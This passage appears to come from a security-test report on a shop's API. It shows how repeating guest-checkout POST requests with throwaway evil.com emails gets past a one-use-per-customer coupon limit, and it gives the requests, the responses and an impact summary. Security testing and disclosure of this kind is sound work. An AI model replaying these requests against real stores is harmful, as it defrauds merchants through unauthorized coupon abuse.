   POST https://shophubonline.store/api/orders/guest
   Content-Type: application/json
   Body: {"guestEmail": "bypass1@evil.com", "guestName": "Bypass One", "guestPhone": "1111111111",
          "shippingAddress": {"street": "1 Evil St", "city": "Mumbai", "state": "MH", "zipCode": "400001", "country": "India"},
          "paymentMethod": "cod", "items": [{"productId": 24, "quantity": 1}], "couponCode": "TESTLIMIT1"}
   Response HTTP 201: {"order": {"couponCode": "TESTLIMIT1", "discount": 1.50, "total": 62.49}}

   POST https://shophubonline.store/api/orders/guest
   Body: {"guestEmail": "bypass2@evil.com", ..., "couponCode": "TESTLIMIT1"}
   Response HTTP 201: {"order": {"couponCode": "TESTLIMIT1", "discount": 1.50, "total": 62.49}}

   POST https://shophubonline.store/api/orders/guest
   Body: {"guestEmail": "bypass3@evil.com", ..., "couponCode": "TESTLIMIT1"}
   Response HTTP 201: {"order": {"couponCode": "TESTLIMIT1", "discount": 1.50, "total": 62.49}}
   ```

3. **Confirm registered users are properly blocked after 1 use:**
   ```
   POST https://shophubonline.store/api/orders (with auth token, 2nd use)
   Authorization: Bearer [REGISTERED_USER_TOKEN]
   Body: {..., "couponCode": "TESTLIMIT1"}

   Response HTTP 500: {"message": "You have already used this coupon"}
   — Registered users correctly blocked; guests bypass the check entirely
   ```

**Proof of Impact:**
- 3/3 guest orders with different email addresses received the coupon discount
- perUserLimit=1 had zero effect on guest orders
- Each bypass saved $1.50 (10% of $14.99); at scale this is unlimited revenue loss
- Registered users correctly blocked after 1 use, confirming guests-only bypass

---

